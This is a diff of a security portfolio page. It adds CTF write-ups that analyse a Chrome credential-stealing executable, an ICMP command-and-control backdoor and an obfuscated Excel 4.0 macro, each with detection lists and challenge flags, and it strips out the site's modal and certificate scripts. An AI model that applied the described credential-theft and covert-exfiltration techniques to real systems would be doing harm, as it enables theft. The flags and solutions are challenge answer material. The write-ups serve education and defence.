+            <h4>🔍 Phase 4: Malware Analysis</h4>
+            <p data-i18n="writeup_gimme_phase4">Following the PowerShell steps, I obtained
+                <code>health_check.exe</code>. Running this executable revealed credential theft behavior:</p>
+            <ul>
+                <li><code>chrome_health_result</code> - SQLite database (Chrome Login Data with saved passwords)</li>
+                <li><code>chrome_service_result</code> - Chrome Local State (encryption key for decrypting Login Data)
+                </li>
+                <li>Files compressed into <strong>password-protected ZIP</strong> and uploaded via POST</li>
+            </ul>
+            <img src="assets/img/vcspassport2025/image17.png" alt="Malware execution analysis">
+
+            <h4>💡 Phase 5: The Breakthrough - IDA Reverse Engineering</h4>
+            <p data-i18n="writeup_gimme_breakthrough">Returning to the PCAP, I found a POST request to
+                <code>/upload</code> with the exfiltrated ZIP (signature <code>50 4b 03 04</code>). The ZIP required a
+                password, so I loaded <code>health_check.exe</code> into <strong>IDA Pro</strong>.</p>
+
+            <p data-i18n="writeup_gimme_ida">Searching for "pass" revealed three functions: <code>GenPass1</code>,
+                <code>GenPass2</code>, <code>GenPass3</code>. Following these in IDA View-A, I reconstructed the
+                password:</p>
+            <blockquote><code>sup3r_S3(ReT_p4$$wod</code></blockquote>
+            <img src="assets/img/vcspassport2025/image20.png" alt="IDA GenPass analysis">
+
+            <p data-i18n="writeup_gimme_flag">Using this password to extract the ZIP, I examined
+                <code>chrome_health_result</code> and found the URL containing the flag.</p>
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li><strong>Network:</strong> Monitor SharePoint for anomalous <code>CompressedDataTable</code>
+                        parameters</li>
+                    <li><strong>Endpoint:</strong> Alert on <code>certutil -decode</code> execution chains</li>
+                    <li><strong>Behavioral:</strong> Detect Chrome database access by non-browser processes</li>
+                    <li><strong>Exfiltration:</strong> Monitor ZIP creation in <code>C:\Windows\Temp</code> with
+                        immediate uploads</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> VCSPassport{SH4R3_y0R_P$$wD}</blockquote>
+        </div>
+    </template>
+
+    <template id="writeup-for2-icmp">
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_for2_summary">Network forensics revealing covert C2 communication via ICMP
+                    protocol. Attacker utilized ping packets to execute commands and exfiltrate sensitive data—a classic
+                    example of data exfiltration over alternative protocols.</p>
+            </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1095</code></td>
+                        <td>Non-Application Layer Protocol</td>
+                        <td>ICMP for C2 communication</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1048.003</code></td>
+                        <td>Exfiltration Over Alternative Protocol</td>
+                        <td>Data hidden in ICMP packets</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1041</code></td>
+                        <td>Exfiltration Over C2 Channel</td>
+                        <td>Flag file extraction</td>
+                    </tr>
+                </table>
+            </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_for2_intro">PCAP containing ICMP backdoor traffic with command execution revealed
+                through Wireshark analysis.</p>
+            <img src="assets/img/vcspassport2024/image1.png" alt="ICMP traffic analysis">
+
+            <p data-i18n="writeup_for2_analysis">ICMP packets contained ASCII commands like
+                <code>download C:\tmp\flag_1s_ck4mpj0n.txt</code>. TCP stream confirmed command execution.
+            </p>
+            <img src="assets/img/vcspassport2024/image2.png" alt="ICMP command packet">
+            <img src="assets/img/vcspassport2024/image3.png" alt="TCP confirmation">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_for2_breakthrough">Subsequent packets contained ASCII art spelling the flag in
+                stylized text format.</p>
+            <img src="assets/img/vcspassport2024/image5.png" alt="ASCII art extraction">
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Monitor for unusual ICMP packet sizes (&gt;100 bytes)</li>
+                    <li>Alert on printable ASCII characters in ICMP payloads</li>
+                    <li>Detect command strings like "download", "openfile" in ICMP</li>
+                    <li>Correlate ICMP spikes with TCP data transfers</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> VCS{I_AM_LOSER}</blockquote>
+        </div>
+    </template>
+
+    <template id="writeup-re02-macro">
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_re02_summary">Analysis of an obfuscated XLM (Excel 4.0) macro embedded in a
+                    malicious Excel document. The macro launches calculator as a decoy while hiding the flag through
+                    string manipulation across multiple cells.</p>
+            </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1059.005</code></td>
+                        <td>Visual Basic</td>
+                        <td>XLM macro execution</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1204.002</code></td>
+                        <td>Malicious File</td>
+                        <td>User opens infected Excel</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files</td>
+                        <td>String reversal/splitting</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1140</code></td>
+                        <td>Deobfuscate</td>
+                        <td>Runtime string assembly</td>
+                    </tr>
+                </table>
+            </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_re02_intro">Excel document with XLM macro containing hint about hidden flag across
+                cells B128, D70, E178.</p>
+            <img src="assets/img/vcspassport2024/image7.png" alt="Excel document">
+
+            <p data-i18n="writeup_re02_analysis">Strings output showed obfuscation pattern but contained erroneous
+                characters.</p>
+            <img src="assets/img/vcspassport2024/image8.png" alt="Strings output">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_re02_breakthrough"><code>olevba</code> properly deobfuscated the macro, revealing
+                actual cell values witout erroneous characters.</p>
+            <img src="assets/img/vcspassport2024/image9.png" alt="olevba analysis">
+
+            <pre><code class="language-bash"># olevba command
+olevba RE02.xls
+
+# Key findings:
+# B128 reversed: VCS{
+# D70: MY_SUPERPOWER
+# E178 reversed: _IS_RICH}</code></pre>
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Alert on Excel files containing XLM macro sheets</li>
+                    <li>Monitor for <code>EXEC</code> function calls in spreadsheets</li>
+                    <li>Detect Excel spawning child processes (calc.exe, cmd.exe)</li>
+                    <li>Flag <code>xlm_macro</code> OLE streams in documents</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> VCS{MY_SUPERPOWER_IS_RICH}</blockquote>
+        </div>
+    </template>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="assets/js/data.js"></script>
+    <script src="assets/js/writeups.js"></script>
+    <script src="assets/js/main.js"></script>
     <script>
         // Initialize Lucide icons
         lucide.createIcons();
-
-        // Modal functionality
-        const modal = document.getElementById('modal');
-        const modalOverlay = document.getElementById('modal-overlay');
-        const modalClose = document.getElementById('modal-close');
-        const modalTitle = document.getElementById('modal-title');
-        const modalContent = document.getElementById('modal-content');
-        const writeupCards = document.querySelectorAll('.writeup-card');
-
-        const writeupData = {
-            'gimme-your-point': { title: 'Gimme Your Point - VCSPassport2025', template: 'writeup-gimme-your-point' },
-            'for2-icmp': { title: 'FOR2 - ICMP Backdoor Analysis', template: 'writeup-for2-icmp' },
-            're02-macro': { title: 'RE02 - Excel Macro De-obfuscation', template: 'writeup-re02-macro' },
-            'ezlogic': { title: 'EzLogic', template: 'writeup-ezlogic' },
-            'easy-forensics': { title: 'Easy Forensics', template: 'writeup-easy-forensics' },
-            'known-unknowns': { title: 'Known Unknowns', template: 'writeup-known-unknowns' },
-            'tet-riffic': { title: 'tet-riffic!', template: 'writeup-tet-riffic' },
-            'st3g0': { title: 'St3g0', template: 'writeup-st3g0' },
-            'verify': { title: 'Verify', template: 'writeup-verify' },
-            'm00nwalk': { title: 'm00nwalk', template: 'writeup-m00nwalk' }
-        };
-
-        function openModal(writeupId) {
-            const data = writeupData[writeupId];
-            if (!data) return;
-
-            modalTitle.textContent = data.title;
-            const template = document.getElementById(data.template);
-            modalContent.innerHTML = template.innerHTML;
-
-            // Re-highlight code blocks
-            Prism.highlightAllUnder(modalContent);
-            // Re-init icons
-            lucide.createIcons();
-
-            modal.classList.add('open');
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeModal() {
-            modal.classList.remove('open');
-            document.body.style.overflow = '';
-        }
-
-        writeupCards.forEach(card => {
-            card.addEventListener('click', () => {
-                const writeupId = card.dataset.writeup;
-                openModal(writeupId);
-            });
-        });
-
-        modalClose.addEventListener('click', closeModal);
-        modalOverlay.addEventListener('click', closeModal);
-
-        // Close modal on Escape key
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                closeLightbox();
-                closeModal();
-            }
-        });
-
-        // Lightbox functionality
-        const lightbox = document.getElementById('lightbox');
-        const lightboxImg = document.getElementById('lightbox-img');
-        const lightboxClose = document.getElementById('lightbox-close');
-
-        function openLightbox(src) {
-            lightboxImg.src = src;
-            lightbox.classList.add('open');
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeLightbox() {
-            lightbox.classList.remove('open');
-            if (!modal.classList.contains('open')) {
-                document.body.style.overflow = '';
-            }
-        }
-
-        lightboxClose.addEventListener('click', closeLightbox);
-        lightbox.addEventListener('click', (e) => {
-            if (e.target === lightbox) closeLightbox();
-        });
-
-        // Add click handlers to images in modal content
-        function setupImageLightbox() {
-            const modalImages = modalContent.querySelectorAll('img');
-            modalImages.forEach(img => {
-                img.classList.add('writeup-image');
-                img.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    openLightbox(img.src);
-                });
-            });
-        }
-
-        // Override openModal to setup image lightbox
-        const originalOpenModal = openModal;
-        openModal = function (writeupId) {
-            const data = writeupData[writeupId];
-            if (!data) return;
-
-            modalTitle.textContent = data.title;
-            const template = document.getElementById(data.template);
-            modalContent.innerHTML = template.innerHTML;
-
-            // Re-highlight code blocks
-            Prism.highlightAllUnder(modalContent);
-            // Re-init icons
-            lucide.createIcons();
-            // Setup image lightbox
-            setupImageLightbox();
-
-            // Translate content if function exists
-            if (typeof changeLanguage === 'function') {
-                changeLanguage(localStorage.getItem('lang') || 'en');
-            }
-
-            modal.classList.add('open');
-            document.body.style.overflow = 'hidden';
-        };
-
-        // Filter functionality
-        const filterBtns = document.querySelectorAll('.filter-btn');
-
-        filterBtns.forEach(btn => {
-            btn.addEventListener('click', () => {
-                // Update active state
-                filterBtns.forEach(b => b.classList.remove('active'));
-                btn.classList.add('active');
-
-                const filter = btn.dataset.filter;
-
-                writeupCards.forEach(card => {
-                    if (filter === 'all' || card.dataset.category === filter) {
-                        card.style.display = 'block';
-                    } else {
-                        card.style.display = 'none';
-                    }
-                });
-            });
-        });
-
-        // Header scroll effect
-        const header = document.getElementById('header');
-        let lastScroll = 0;
-
-        window.addEventListener('scroll', () => {
-            const currentScroll = window.pageYOffset;
-
-            if (currentScroll > 100) {
-                header.classList.add('shadow-lg');
-            } else {
-                header.classList.remove('shadow-lg');
-            }
-
-            lastScroll = currentScroll;
-        });
-
-        // Certificate Modal Logic with Lazy Preload & Cache
-        const certificateCards = document.querySelectorAll('.certificate-card');
-        const certificateCache = new Map(); // Memory cache for preloaded certificates
-        let preloadingInProgress = false;
-        let certificatesPreloaded = false;
-
-        // Preload a single certificate PDF into cache (creates iframe in background)
-        function preloadCertificate(pdfUrl) {
-            return new Promise((resolve) => {
-                if (certificateCache.has(pdfUrl)) {
-                    resolve(true);
-                    return;
-                }
-
-                const viewerUrl = `https://docs.google.com/viewer?url=${encodeURIComponent(pdfUrl)}&embedded=true`;
-
-                // Create hidden iframe to preload
-                const preloadFrame = document.createElement('iframe');
-                preloadFrame.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;left:-9999px;';
-                preloadFrame.src = viewerUrl;
-
-                preloadFrame.onload = () => {
-                    // Store the viewer URL in cache
-                    certificateCache.set(pdfUrl, viewerUrl);
-                    // Remove preload iframe after caching
-                    setTimeout(() => {
-                        if (preloadFrame.parentNode) {
-                            preloadFrame.parentNode.removeChild(preloadFrame);
-                        }
-                    }, 100);
-                    resolve(true);
-                };
-
-                preloadFrame.onerror = () => {
-                    // Even on error, cache it so we don't retry
-                    certificateCache.set(pdfUrl, viewerUrl);
-                    resolve(false);
-                };
-
-                document.body.appendChild(preloadFrame);
-            });
-        }
-
-        // Preload all certificates gradually using requestIdleCallback
-        function preloadAllCertificates() {
-            if (preloadingInProgress || certificatesPreloaded) return;
-            preloadingInProgress = true;
-
-            const pdfUrls = Array.from(certificateCards)
-                .map(card => card.dataset.pdf)
-                .filter(url => url && !certificateCache.has(url));
-
-            if (pdfUrls.length === 0) {
-                preloadingInProgress = false;
-                certificatesPreloaded = true;
-                return;
-            }
-
-            let currentIndex = 0;
-
-            function preloadNext(deadline) {
-                // Check if we have time or if we're done
-                while (currentIndex < pdfUrls.length && (deadline.timeRemaining() > 10 || deadline.didTimeout)) {
-                    const url = pdfUrls[currentIndex];
-                    preloadCertificate(url);
-                    currentIndex++;
-
-                    // Only preload one at a time to avoid overwhelming the browser
-                    if (currentIndex < pdfUrls.length) {
-                        // Schedule next preload with delay
-                        setTimeout(() => {
-                            if ('requestIdleCallback' in window) {
-                                requestIdleCallback(preloadNext, { timeout: 5000 });
-                            } else {
-                                preloadNext({ timeRemaining: () => 50, didTimeout: false });
-                            }
-                        }, 500); // 500ms delay between each preload
-                        return;
-                    }
-                }
-
-                if (currentIndex >= pdfUrls.length) {
-                    preloadingInProgress = false;
-                    certificatesPreloaded = true;
-                    console.log('✅ All certificates preloaded and cached');
-                }
-            }
-
-            // Start preloading
-            if ('requestIdleCallback' in window) {
-                requestIdleCallback(preloadNext, { timeout: 5000 });
-            } else {
-                // Fallback for Safari
-                setTimeout(() => preloadNext({ timeRemaining: () => 50, didTimeout: false }), 100);
-            }
-        }
-
-        // Use Intersection Observer to start preloading when user scrolls near certifications section
-        const certificationsSection = document.getElementById('certifications');
-
-        // Start preloading certificates immediately after page load
-        window.addEventListener('load', () => {
-            // Short delay to let initial render complete, then start background preload
-            setTimeout(() => {
-                preloadAllCertificates();
-            }, 1000); // 1 second delay after page load
-        });
-
-        function openCertificateModal(title, pdfUrl) {
-            modalTitle.textContent = title;
-
-            // Check cache first
-            const cachedViewerUrl = certificateCache.get(pdfUrl);
-            const viewerUrl = cachedViewerUrl || `https://docs.google.com/viewer?url=${encodeURIComponent(pdfUrl)}&embedded=true`;
-
-            const isCached = certificateCache.has(pdfUrl);
-
-            modalContent.innerHTML = `
-                <div class="w-full h-[80vh] rounded-xl overflow-hidden bg-gray-900 flex items-center justify-center relative">
-                    ${!isCached ? `
-                    <div id="cert-loading" class="absolute inset-0 flex flex-col items-center justify-center bg-gray-900 z-10">
-                        <div class="w-8 h-8 border-2 border-emerald-accent border-t-transparent rounded-full animate-spin mb-3"></div>
-                        <p class="text-gray-400 text-sm">Loading certificate...</p>
-                    </div>
-                    ` : ''}
-                    <iframe 
-                        id="cert-iframe"
-                        src="${viewerUrl}" 
-                        style="width:100%; height:100%;" 
-                        frameborder="0"
-                        ${isCached ? '' : 'onload="document.getElementById(\'cert-loading\')?.remove()"'}
-                    ></iframe>
-                </div>
-                <div class="mt-4 text-center">
-                    <a href="${pdfUrl}" target="_blank" rel="noopener" class="text-emerald-accent hover:underline text-sm font-mono">
-                        Download / Open in new tab
-                    </a>
-                </div>
-            `;
-
-            // Cache this URL if not already cached
-            if (!isCached) {
-                certificateCache.set(pdfUrl, viewerUrl);
-            }
-
-            modal.classList.add('open');
-            document.body.style.overflow = 'hidden';
-
-            // Re-init icons just in case
-            lucide.createIcons();
-        }
-
-        certificateCards.forEach(card => {
-            card.addEventListener('click', () => {
-                const titleKey = card.querySelector('h3').getAttribute('data-i18n');
-                // Try to get translated title from h3, fallback to text content
-                let title = card.querySelector('h3').textContent;
-
-                const pdfUrl = card.dataset.pdf;
-                if (pdfUrl) {
-                    openCertificateModal(title, pdfUrl);
-                }
-            });
-        });
     </script>
-
-    <!-- Bilingual Support -->
-    <script src="assets/js/data.js"></script>
-
 </body>
 
 </html>
